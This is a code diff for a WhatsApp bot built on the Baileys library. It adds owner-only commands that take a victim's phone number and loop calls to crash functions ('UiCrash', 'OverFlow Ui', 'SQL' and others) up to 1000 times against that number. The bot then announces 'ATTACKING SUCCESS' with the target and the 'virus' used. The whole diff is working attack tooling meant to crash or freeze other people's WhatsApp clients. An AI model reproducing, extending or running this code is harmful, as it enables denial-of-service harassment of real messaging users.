+				if (!q) return m.reply(`*Syntax Error!*\n\n_Use : CursorX Number_\n_Example : CursorX 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
+				let {
+					proto,
+					generateWAMessageFromContent
+				} = require('@whiskeysockets/baileys')
+				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
+				if (incTarget.startsWith('0')) return m.reply(`*Syntax Error!*\n\n_Use : TrashFlow Number_\n_Example : TrashFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
+				let X = incTarget + '@s.whatsapp.net';
+				if (owner.includes(incTarget)) {
+					m.reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
+				} else {
+					zreply(mess.bugrespon)
+					global.jumlah = text.split("|")[1]
+					for (let i = 0; i < 1; i++) {
+						await InteractiveSQLRelay(X, null, 77777)
+						await InteractiveSQLRelay(X, CrSql)
+						await CrNoQtd(X)
+						await CrNoQtd(X)
+					}
+					let msg = generateWAMessageFromContent(m.chat, {
+						viewOnceMessage: {
+							message: {
+								"messageContextInfo": {
+									"deviceListMetadata": {},
+									"deviceListMetadataVersion": 2
+								},
+								interactiveMessage: proto.Message.InteractiveMessage.create({
+									contextInfo: {
+										mentionedJid: [m.sender],
+										isForwarded: true,
+										forwardingScore: 999,
+										forwardedNewsletterMessageInfo: {
+											newsletterJid: global.xchannel.jid,
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
+											serverMessageId: -1
+										},
+										businessMessageForwardInfo: {
+											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
+										},
+									},
+									body: proto.Message.InteractiveMessage.Body.create({
+										text: ''
+									}),
+									footer: proto.Message.InteractiveMessage.Footer.create({
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
+									}),
+									header: proto.Message.InteractiveMessage.Header.create({
+										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗖𝘂𝗿𝘀𝗼𝗿 𝗫 𝗙𝗹𝗼𝘄`,
+										subtitle: "",
+										hasMediaAttachment: true,
+										...(await prepareWAMessageMedia({
+											image: {
+												url: thumbSky
+											}
+										}, {
+											upload: VxoZap.waUploadToServer
+										}))
+									}),
+									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+										buttons: [{
+											"name": "quick_reply",
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"Flowfold ${incTarget}\"}`
+										}, ],
+									})
+								})
+							}
+						}
+					}, {})
+
+					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
+						messageId: msg.key.id
+					});
+					await taskdone(finishmoji)
+				}
+			}
+			break
+			case 'cursorxpay': {
+				if (!isCreator) return m.reply(mess.owner)
+				if (!q) return m.reply(`*Syntax Error!*\n\n_Use : CursorX Number_\n_Example : CursorX 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
+				let {
+					proto,
+					generateWAMessageFromContent
+				} = require('@whiskeysockets/baileys')
+				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
+				if (incTarget.startsWith('0')) return m.reply(`*Syntax Error!*\n\n_Use : TrashFlow Number_\n_Example : TrashFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
+				let X = incTarget + '@s.whatsapp.net';
+				if (owner.includes(incTarget)) {
+					m.reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
+				} else {
+					zreply(mess.bugrespon)
+					global.jumlah = text.split("|")[1]
+					for (let i = 0; i < 1; i++) {
+						await InteractiveSQLRelay(X, null, 77777)
+						await InteractiveSQLRelay(X, CrSql)
+						await CrQtd(X)
+						await CrQtd(X)
+					}
+					let msg = generateWAMessageFromContent(m.chat, {
+						viewOnceMessage: {
+							message: {
+								"messageContextInfo": {
+									"deviceListMetadata": {},
+									"deviceListMetadataVersion": 2
+								},
+								interactiveMessage: proto.Message.InteractiveMessage.create({
+									contextInfo: {
+										mentionedJid: [m.sender],
+										isForwarded: true,
+										forwardingScore: 999,
+										forwardedNewsletterMessageInfo: {
+											newsletterJid: global.xchannel.jid,
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
+											serverMessageId: -1
+										},
+										businessMessageForwardInfo: {
+											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
+										},
+									},
+									body: proto.Message.InteractiveMessage.Body.create({
+										text: ''
+									}),
+									footer: proto.Message.InteractiveMessage.Footer.create({
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
+									}),
+									header: proto.Message.InteractiveMessage.Header.create({
+										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗖𝘂𝗿𝘀𝗼𝗿 𝗫 𝗗𝗲𝘅`,
+										subtitle: "",
+										hasMediaAttachment: true,
+										...(await prepareWAMessageMedia({
+											image: {
+												url: thumbSky
+											}
+										}, {
+											upload: VxoZap.waUploadToServer
+										}))
+									}),
+									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+										buttons: [{
+											"name": "quick_reply",
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"Payflod ${incTarget}\"}`
+										}, ],
+									})
+								})
+							}
+						}
+					}, {})
+
+					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
+						messageId: msg.key.id
+					});
+					await taskdone(finishmoji)
+				}
+			}
+			break		
+			case 'flowxdex': {
+				if (!isCreator) return m.reply(mess.owner)
+				if (!q) return m.reply(`*Syntax Error!*\n\n_Use : MsgFlow Number_\n_Example : MsgFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
+				let {
+					proto,
+					generateWAMessageFromContent
+				} = require('@whiskeysockets/baileys')
+				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
+				if (incTarget.startsWith('0')) return m.reply(`*Syntax Error!*\n\n_Use : TrashFlow Number_\n_Example : TrashFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
+				let X = incTarget + '@s.whatsapp.net';
+				if (owner.includes(incTarget)) {
+					m.reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
+				} else {
+					zreply(mess.bugrespon)
+					global.jumlah = text.split("|")[1]
+					for (let i = 0; i < 25; i++) {
+						await CrNoQtd(X)
+						await CrQtd(X)
+					}
+					let msg = generateWAMessageFromContent(m.chat, {
+						viewOnceMessage: {
+							message: {
+								"messageContextInfo": {
+									"deviceListMetadata": {},
+									"deviceListMetadataVersion": 2
+								},
+								interactiveMessage: proto.Message.InteractiveMessage.create({
+									contextInfo: {
+										mentionedJid: [m.sender],
+										isForwarded: true,
+										forwardingScore: 999,
+										forwardedNewsletterMessageInfo: {
+											newsletterJid: global.xchannel.jid,
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
+											serverMessageId: -1
+										},
+										businessMessageForwardInfo: {
+											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
+										},
+									},
+									body: proto.Message.InteractiveMessage.Body.create({
+										text: ''
+									}),
+									footer: proto.Message.InteractiveMessage.Footer.create({
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
+									}),
+									header: proto.Message.InteractiveMessage.Header.create({
+										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗖𝘂𝗿𝘀𝗼𝗿 𝗙𝗹𝗼𝘄 𝗫 𝗗𝗲𝘅`,
+										subtitle: "",
+										hasMediaAttachment: true,
+										...(await prepareWAMessageMedia({
+											image: {
+												url: thumbSky
+											}
+										}, {
+											upload: VxoZap.waUploadToServer
+										}))
+									}),
+									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+										buttons: [{
+											"name": "quick_reply",
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"flowfold ${incTarget}\"}`
+										}, ],
+									})
+								})
+							}
+						}
+					}, {})
+
+					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
+						messageId: msg.key.id
+					});
+					await taskdone(finishmoji)
+				}
+			}
+			break
+			case 'uicrash': {
+				if (!isCreator) return m.reply(mess.owner)
+				if (!q) return m.reply(`*Syntax Error!*\n\n_Use : CursorX Number_\n_Example : CursorX 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
+				let {
+					proto,
+					generateWAMessageFromContent
+				} = require('@whiskeysockets/baileys')
+				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
+				if (incTarget.startsWith('0')) return m.reply(`*Syntax Error!*\n\n_Use : TrashFlow Number_\n_Example : TrashFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
+				let X = incTarget + '@s.whatsapp.net';
+				if (owner.includes(incTarget)) {
+					m.reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
+				} else {
+					zreply(mess.bugrespon)
+					global.jumlah = text.split("|")[1]
+					for (let i = 0; i < 500; i++) {
+						await EpUi(X)						
+					}
+					let msg = generateWAMessageFromContent(m.chat, {
+						viewOnceMessage: {
+							message: {
+								"messageContextInfo": {
+									"deviceListMetadata": {},
+									"deviceListMetadataVersion": 2
+								},
+								interactiveMessage: proto.Message.InteractiveMessage.create({
+									contextInfo: {
+										mentionedJid: [m.sender],
+										isForwarded: true,
+										forwardingScore: 999,
+										forwardedNewsletterMessageInfo: {
+											newsletterJid: global.xchannel.jid,
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
+											serverMessageId: -1
+										},
+										businessMessageForwardInfo: {
+											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
+										},
+									},
+									body: proto.Message.InteractiveMessage.Body.create({
+										text: ''
+									}),
+									footer: proto.Message.InteractiveMessage.Footer.create({
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
+									}),
+									header: proto.Message.InteractiveMessage.Header.create({
+										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗨𝗶𝗖𝗿𝗮𝘀𝗵`,
+										subtitle: "",
+										hasMediaAttachment: true,
+										...(await prepareWAMessageMedia({
+											image: {
+												url: thumbSky
+											}
+										}, {
+											upload: VxoZap.waUploadToServer
+										}))
+									}),
+									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+										buttons: [{
+											"name": "quick_reply",
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"Floduic ${incTarget}\"}`
+										}, ],
+									})
+								})
+							}
+						}
+					}, {})
+
+					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
+						messageId: msg.key.id
+					});
+					await taskdone(finishmoji)
+				}
+			}
+			break
+			case 'floduic': {
+				if (!isCreator) return m.reply(mess.owner)
+				if (!q) return m.reply(`*Syntax Error!*\n\n_Use : CursorX Number_\n_Example : CursorX 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
+				let {
+					proto,
+					generateWAMessageFromContent
+				} = require('@whiskeysockets/baileys')
+				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
+				if (incTarget.startsWith('0')) return m.reply(`*Syntax Error!*\n\n_Use : TrashFlow Number_\n_Example : TrashFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
+				let X = incTarget + '@s.whatsapp.net';
+				if (owner.includes(incTarget)) {
+					m.reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
+				} else {
+					zreply(mess.bugrespon)
+					global.jumlah = text.split("|")[1]
+					for (let i = 0; i < 1000; i++) {
+						await EpUi(X)						
+					}
+					let msg = generateWAMessageFromContent(m.chat, {
+						viewOnceMessage: {
+							message: {
+								"messageContextInfo": {
+									"deviceListMetadata": {},
+									"deviceListMetadataVersion": 2
+								},
+								interactiveMessage: proto.Message.InteractiveMessage.create({
+									contextInfo: {
+										mentionedJid: [m.sender],
+										isForwarded: true,
+										forwardingScore: 999,
+										forwardedNewsletterMessageInfo: {
+											newsletterJid: global.xchannel.jid,
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
+											serverMessageId: -1
+										},
+										businessMessageForwardInfo: {
+											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
+										},
+									},
+									body: proto.Message.InteractiveMessage.Body.create({
+										text: ''
+									}),
+									footer: proto.Message.InteractiveMessage.Footer.create({
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
+									}),
+									header: proto.Message.InteractiveMessage.Header.create({
+										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗢𝘃𝗲𝗿𝗙𝗹𝗼𝘄 𝗨𝗶`,
+										subtitle: "",
+										hasMediaAttachment: true,
+										...(await prepareWAMessageMedia({
+											image: {
+												url: thumbSky
+											}
+										}, {
+											upload: VxoZap.waUploadToServer
+										}))
+									}),
+									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+										buttons: [{
+											"name": "quick_reply",
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
+										}, ],
+									})
+								})
+							}
+						}
+					}, {})
+
+					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
+						messageId: msg.key.id
+					});
+					await taskdone(finishmoji)
+				}
+			}
+			break
+			case 'oneui': {
+				if (!isCreator) return m.reply(mess.owner)
+				if (!q) return m.reply(`*Syntax Error!*\n\n_Use : CursorX Number_\n_Example : CursorX 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
+				let {
+					proto,
+					generateWAMessageFromContent
+				} = require('@whiskeysockets/baileys')
+				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
+				if (incTarget.startsWith('0')) return m.reply(`*Syntax Error!*\n\n_Use : TrashFlow Number_\n_Example : TrashFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
+				let X = incTarget + '@s.whatsapp.net';
+				if (owner.includes(incTarget)) {
+					m.reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
+				} else {
+					zreply(mess.bugrespon)
+					global.jumlah = text.split("|")[1]
+					for (let i = 0; i < 500; i++) {
+						await EpHemeral(X)						
+					}
+					let msg = generateWAMessageFromContent(m.chat, {
+						viewOnceMessage: {
+							message: {
+								"messageContextInfo": {
+									"deviceListMetadata": {},
+									"deviceListMetadataVersion": 2
+								},
+								interactiveMessage: proto.Message.InteractiveMessage.create({
+									contextInfo: {
+										mentionedJid: [m.sender],
+										isForwarded: true,
+										forwardingScore: 999,
+										forwardedNewsletterMessageInfo: {
+											newsletterJid: global.xchannel.jid,
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
+											serverMessageId: -1
+										},
+										businessMessageForwardInfo: {
+											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
+										},
+									},
+									body: proto.Message.InteractiveMessage.Body.create({
+										text: ''
+									}),
+									footer: proto.Message.InteractiveMessage.Footer.create({
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
+									}),
+									header: proto.Message.InteractiveMessage.Header.create({
+										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗢𝗻𝗲𝗨𝗶`,
+										subtitle: "",
+										hasMediaAttachment: true,
+										...(await prepareWAMessageMedia({
+											image: {
+												url: thumbSky
+											}
+										}, {
+											upload: VxoZap.waUploadToServer
+										}))
+									}),
+									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+										buttons: [{
+											"name": "quick_reply",
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"Flodone ${incTarget}\"}`
+										}, ],
+									})
+								})
+							}
+						}
+					}, {})
+
+					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
+						messageId: msg.key.id
+					});
+					await taskdone(finishmoji)
+				}
+			}
+			break
+			case 'flodone': {
+				if (!isCreator) return m.reply(mess.owner)
+				if (!q) return m.reply(`*Syntax Error!*\n\n_Use : CursorX Number_\n_Example : CursorX 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
+				let {
+					proto,
+					generateWAMessageFromContent
+				} = require('@whiskeysockets/baileys')
+				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
+				if (incTarget.startsWith('0')) return m.reply(`*Syntax Error!*\n\n_Use : TrashFlow Number_\n_Example : TrashFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
+				let X = incTarget + '@s.whatsapp.net';
+				if (owner.includes(incTarget)) {
+					m.reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
+				} else {
+					zreply(mess.bugrespon)
+					global.jumlah = text.split("|")[1]
+					for (let i = 0; i < 1000; i++) {
+						await EpHemeral(X)						
+					}
+					let msg = generateWAMessageFromContent(m.chat, {
+						viewOnceMessage: {
+							message: {
+								"messageContextInfo": {
+									"deviceListMetadata": {},
+									"deviceListMetadataVersion": 2
+								},
+								interactiveMessage: proto.Message.InteractiveMessage.create({
+									contextInfo: {
+										mentionedJid: [m.sender],
+										isForwarded: true,
+										forwardingScore: 999,
+										forwardedNewsletterMessageInfo: {
+											newsletterJid: global.xchannel.jid,
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
+											serverMessageId: -1
+										},
+										businessMessageForwardInfo: {
+											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
+										},
+									},
+									body: proto.Message.InteractiveMessage.Body.create({
+										text: ''
+									}),
+									footer: proto.Message.InteractiveMessage.Footer.create({
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
+									}),
+									header: proto.Message.InteractiveMessage.Header.create({
+										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗙𝗹𝗼𝘄 𝗢𝗻𝗲𝗨𝗶`,
+										subtitle: "",
+										hasMediaAttachment: true,
+										...(await prepareWAMessageMedia({
+											image: {
+												url: thumbSky
+											}
+										}, {
+											upload: VxoZap.waUploadToServer
+										}))
+									}),
+									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+										buttons: [{
+											"name": "quick_reply",
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
+										}, ],
+									})
+								})
+							}
+						}
+					}, {})
+
+					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
+						messageId: msg.key.id
+					});
+					await taskdone(finishmoji)
+				}
+			}
+			break
+			//=================================================//
+
+
+			// CASE BUG \\
+			//=================================================//
+			case 'ion': {
+				if (!isCreator) return zreply(mess.owner)
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : ION Number_\n_Example : ION 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
+				let {
+					proto,
+					generateWAMessageFromContent
+				} = require('@whiskeysockets/baileys')
+				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : ION Number_\n_Example : ION 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
+				let X = incTarget + '@s.whatsapp.net';
+				if (owner.includes(incTarget)) {
+					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
+				} else {
+					zreply(mess.bugrespon)
+					global.jumlah = text.split("|")[1]
+					for (let i = 0; i < 1; i++) {
+						await StuckSql(X, GetsuZo, Ptcp = false)
+					}
+					let msg = generateWAMessageFromContent(m.chat, {
+						viewOnceMessage: {
+							message: {
+								"messageContextInfo": {
+									"deviceListMetadata": {},
+									"deviceListMetadataVersion": 2
+								},
+								interactiveMessage: proto.Message.InteractiveMessage.create({
+									contextInfo: {
+										mentionedJid: [m.sender],
+										isForwarded: true,
+										forwardingScore: 999,
+										forwardedNewsletterMessageInfo: {
+											newsletterJid: global.xchannel.jid,
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
+											serverMessageId: -1
+										},
+										businessMessageForwardInfo: {
+											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
+										},
+									},
+									body: proto.Message.InteractiveMessage.Body.create({
+										text: ''
+									}),
+									footer: proto.Message.InteractiveMessage.Footer.create({
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
 										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗝𝗜𝗗𝗦 𝗫 𝗦𝗤𝗟`,
@@ -6056,7 +8713,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": `{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"\"}`
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
 										}, ],
 									})
 								})
@@ -6072,15 +8729,14 @@ break
 			}
 			break
 			case 'infinite': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Infinite Number_\n_Example : Infinite 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Infinite Number_\n_Example : Infinite 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Infinite Number_\n_Example : Infinite 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Infinite Number_\n_Example : Infinite 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
 					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
@@ -6088,7 +8744,7 @@ break
 					zreply(`*𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙄𝙣𝙛𝙞𝙣𝙞𝙩𝙮⚡*`)
 					global.jumlah = text.split("|")[1]
 					for (let i = 0; i < 20; i++) {
-						await ZnXIvS(X, Ptcp = true)
+						await ZnXIvS(X, Ptcp = false)
 					}
 					let msg = generateWAMessageFromContent(m.chat, {
 						viewOnceMessage: {
